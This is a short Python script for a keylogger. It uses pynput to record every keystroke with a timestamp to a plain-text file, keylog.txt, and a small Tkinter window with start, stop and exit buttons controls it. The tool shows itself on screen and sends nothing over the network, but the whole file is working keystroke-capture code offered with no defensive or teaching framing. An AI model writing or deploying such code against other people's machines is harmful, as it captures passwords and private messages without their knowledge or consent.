from pynput.keyboard import Key, Listener
import logging
import tkinter as tk
from tkinter import messagebox

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to handle key presses
def on_press(key):
    logging.info(str(key))

# Function to start the keylogger
def start_keylogger():
    try:
        global listener
        listener = Listener(on_press=on_press)
        listener.start()
        messagebox.showinfo("Keylogger", "Keylogger started. Keystrokes are being logged to keylog.txt.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        messagebox.showinfo("Keylogger", "Keylogger stopped.")
    else:
        messagebox.showinfo("Keylogger", "Keylogger is not running.")

# Create Tkinter GUI
root = tk.Tk()
root.title("Keylogger")
root.geometry("300x100")

# Start Keylogger Button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

# Stop Keylogger Button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5)

# Exit Button
exit_button = tk.Button(root, text="Exit", command=root.quit)
exit_button.pack(pady=5)

root.mainloop()
